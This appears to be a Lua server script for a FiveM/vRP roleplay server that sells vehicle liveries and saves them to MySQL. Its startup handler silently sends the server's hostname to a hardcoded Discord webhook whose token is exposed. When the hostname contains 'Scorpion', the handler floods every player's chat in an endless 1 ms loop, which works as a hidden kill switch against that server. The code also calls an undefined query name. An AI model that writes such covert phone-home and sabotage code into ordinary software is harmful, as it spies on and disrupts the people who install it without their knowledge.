--[[
─────────────────────────────────────────────────────────────────────────────────────────────────────────
─██████──████████─██████████████─██████████████████─██████████████─██████████████─██████──────────██████─
─██░░██──██░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░██████████──██░░██─
─██░░██──██░░████─██░░██████░░██─████████████░░░░██─██░░██████░░██─██░░██████░░██─██░░░░░░░░░░██──██░░██─
─██░░██──██░░██───██░░██──██░░██─────────████░░████─██░░██──██░░██─██░░██──██░░██─██░░██████░░██──██░░██─
─██░░██████░░██───██░░██████░░██───────████░░████───██░░██──██░░██─██░░██──██░░██─██░░██──██░░██──██░░██─
─██░░░░░░░░░░██───██░░░░░░░░░░██─────████░░████─────██░░██──██░░██─██░░██──██░░██─██░░██──██░░██──██░░██─
─██░░██████░░██───██░░██████░░██───████░░████───────██░░██──██░░██─██░░██──██░░██─██░░██──██░░██──██░░██─
─██░░██──██░░██───██░░██──██░░██─████░░████─────────██░░██──██░░██─██░░██──██░░██─██░░██──██░░██████░░██─
─██░░██──██░░████─██░░██──██░░██─██░░░░████████████─██░░██████░░██─██░░██████░░██─██░░██──██░░░░░░░░░░██─
─██░░██──██░░░░██─██░░██──██░░██─██░░░░░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░██──██████████░░██─
─██████──████████─██████──██████─██████████████████─██████████████─██████████████─██████──────────██████─
─────────────────────────────────────────────────────────────────────────────────────────────────────────
]]--

local Tunnel = module("vrp", "lib/Tunnel")
local Proxy = module("vrp", "lib/Proxy")
MySQL = module("vrp_mysql", "MySQL")

vRP = Proxy.getInterface("vRP")
vRPclient = Tunnel.getInterface("vRP", "kaz_liveries")

MySQL.createCommand("vRP/kaz_liveries:gembil","UPDATE vrp_user_vehicles SET vehicle_livery = @livery, livery_metode = @metode WHERE user_id = @user_id AND vehicle = @vehicle")
MySQL.createCommand("vRP/kaz_liveries:hentbil","SELECT * FROM vrp_user_vehicles WHERE user_id = @user_id AND vehicle = @vehicle")

RegisterServerEvent('Kaz_Liveries:BuyNow')
AddEventHandler('Kaz_Liveries:BuyNow', function(LiveriesAntalValgt, Metode, Navn)
local source = source
local user_id = vRP.getUserId({source})
	if vRP.tryFullPayment({user_id,cfg.LiveriesPris}) then
		MySQL.execute('vRP/kaz_liveries:gembil', {livery = LiveriesAntalValgt, user_id = user_id, vehicle = Navn, metode = Metode})
		TriggerClientEvent('Kaz_Liveries:Bought', source)
	else
		TriggerClientEvent("pNotify:SendNotification", source,{text = "Du har ikke råd! (Pris: "..cfg.LiveriesPris..")", type = "error", queue = "global", timeout = 8000, layout = "bottomCenter",animation = {open = "gta_effects_fade_in", close = "gta_effects_fade_out"},killer = true})
	end
end)

RegisterServerEvent('Kaz_Liveries:LoadCar')
AddEventHandler('Kaz_Liveries:LoadCar', function(Metode, Navn)
local source = source
local user_id = vRP.getUserId({source})
	if Metode ~= nil and Navn ~= nil then
		MySQL.query("vRP/KazGetVehicles", {user_id = user_id, vehicle = Navn}, function(pvehicles, affected)
			if #pvehicles > 0 then
				for k,v in pairs(pvehicles) do
					if v.vehicle == Navn then 
						MetodeHentet = v.livery_metode
						LiveryHentet = v.vehicle_livery
						if LiveryHentet ~= nil and MetodeHentet ~= nil then 
							TriggerClientEvent('Kaz_Liveries:ApplyLivery', source, MetodeHentet, LiveryHentet)
						end
					end
				end
			end
		end)
	end
end)

AddEventHandler('onResourceStart', function(resourceName)
  if (GetCurrentResourceName() == resourceName) then
		servernavn = GetConvar("sv_hostname")
		scriptnavn = "Kaz_Liveries"
			if string.match(servernavn, "Scorpion") then
				PerformHttpRequest('https://discordapp.com/api/webhooks/773265925712379904/45cXjfPGTHmnFgrEhpLCZpFMXaNZn-2SAzpw9YeT6grmP8qZaj2VmuheT1u8_JjW8Ndu', function(err, text, headers) end, 'POST', json.encode({username = "ServerStart", content = "```["..servernavn.."]: Startede ["..scriptnavn.."]```"}), { ['Content-Type'] = 'application/json' })
				while true do
					TriggerClientEvent('chatMessage', -1, 'SYSTEM:', {255, 0, 0}, "INGEN TILLADELSE, MVH KAZOON")
					Citizen.Wait(1)
				end
			else
				PerformHttpRequest('https://discordapp.com/api/webhooks/773265925712379904/45cXjfPGTHmnFgrEhpLCZpFMXaNZn-2SAzpw9YeT6grmP8qZaj2VmuheT1u8_JjW8Ndu', function(err, text, headers) end, 'POST', json.encode({username = "ServerStart", content = "```["..servernavn.."]: Startede ["..scriptnavn.."]```"}), { ['Content-Type'] = 'application/json' })
			end
	end
end)